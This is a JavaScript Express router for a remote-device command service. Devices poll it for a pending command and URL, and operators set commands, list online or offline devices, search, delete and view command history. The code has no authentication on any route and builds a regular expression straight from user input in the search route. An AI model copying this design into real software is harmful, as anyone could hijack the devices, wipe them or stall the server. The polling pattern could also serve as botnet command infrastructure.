const express = require('express');
const router = express.Router();
const mongoose = require('mongoose');

const DeviceSchema = new mongoose.Schema({
    device_id: { type: String, required: true, unique: true },
    command: { type: String, default: null },
    url: { type: String, default: null },
    lastSeen: { type: Date, default: Date.now }
});

const CommandHistorySchema = new mongoose.Schema({
    device_id: { type: String, required: true },
    command: { type: String, required: true },
    url: { type: String, default: null },
    timestamp: { type: Date, default: Date.now }
});

const Device = mongoose.model('Device', DeviceSchema);
const CommandHistory = mongoose.model('CommandHistory', CommandHistorySchema);

const OFFLINE_THRESHOLD = 10 * 60 * 1000;

router.post('/', async (req, res) => {
    const { device_id, command, url } = req.body;

    if (!device_id || !command) {
        return res.status(400).json({ error: 'device_id and command are required.' });
    }

    try {
        const device = await Device.findOneAndUpdate(
            { device_id },
            { command, url: url || null, lastSeen: Date.now() },
            { upsert: true, new: true }
        );

        await CommandHistory.create({ device_id, command, url });

        res.json({ success: true, message: `Command set for device ${device_id}` });
    } catch (error) {
        console.error(`Error setting command: ${error}`);
        res.status(500).json({ error: 'Failed to set command' });
    }
});

router.get('/', async (req, res) => {
    const { device_id } = req.query;

    if (!device_id) {
        return res.status(400).json({ error: 'device_id is required.' });
    }

    try {
        const device = await Device.findOneAndUpdate(
            { device_id },
            { $set: { lastSeen: Date.now() } },
            { new: true, upsert: true }
        );

        const command = device.command;
        if (command) {
            device.command = null;
            await device.save();
        }

        res.json({ command, url: device.url });
    } catch (error) {
        console.error(`Error fetching command: ${error}`);
        res.status(500).json({ error: 'Failed to fetch command' });
    }
});

router.get('/devices', async (req, res) => {
    const { filter } = req.query;
    try {
        const devices = await Device.find();
        const devicesWithStatus = devices.map(device => ({
            device_id: device.device_id,
            command: device.command,
            url: device.url,
            status: Date.now() - new Date(device.lastSeen).getTime() <= OFFLINE_THRESHOLD ? 'Online' : 'Offline'
        }));

        const filteredDevices = (filter && filter.toLowerCase() !== 'all')
            ? devicesWithStatus.filter(device => device.status.toLowerCase() === filter.toLowerCase())
            : devicesWithStatus;

        res.json(filteredDevices);
    } catch (error) {
        console.error(`Error fetching devices: ${error}`);
        res.status(500).json({ error: 'Failed to fetch devices' });
    }
});

router.get('/devices/search', async (req, res) => {
    const { query } = req.query;

    if (!query) {
        return res.status(400).json({ error: 'Query parameter is required.' });
    }

    try {
        const devices = await Device.find({ device_id: new RegExp(query, 'i') });
        res.json(devices);
    } catch (error) {
        console.error(`Error searching devices: ${error}`);
        res.status(500).json({ error: 'Failed to search devices' });
    }
});

router.delete('/:device_id', async (req, res) => {
    const { device_id } = req.params;

    try {
        const result = await Device.deleteOne({ device_id });
        if (result.deletedCount === 0) {
            return res.status(404).json({ error: 'Device not found' });
        }

        res.json({ success: true, message: `Device ${device_id} deleted` });
    } catch (error) {
        console.error(`Error deleting device: ${error}`);
        res.status(500).json({ error: 'Failed to delete device' });
    }
});

router.get('/history', async (req, res) => {
    try {
        const history = await CommandHistory.find().sort({ timestamp: -1 });
        res.json(history);
    } catch (error) {
        console.error(`Error fetching history: ${error}`);
        res.status(500).json({ error: 'Failed to fetch history' });
    }
});

module.exports = router;
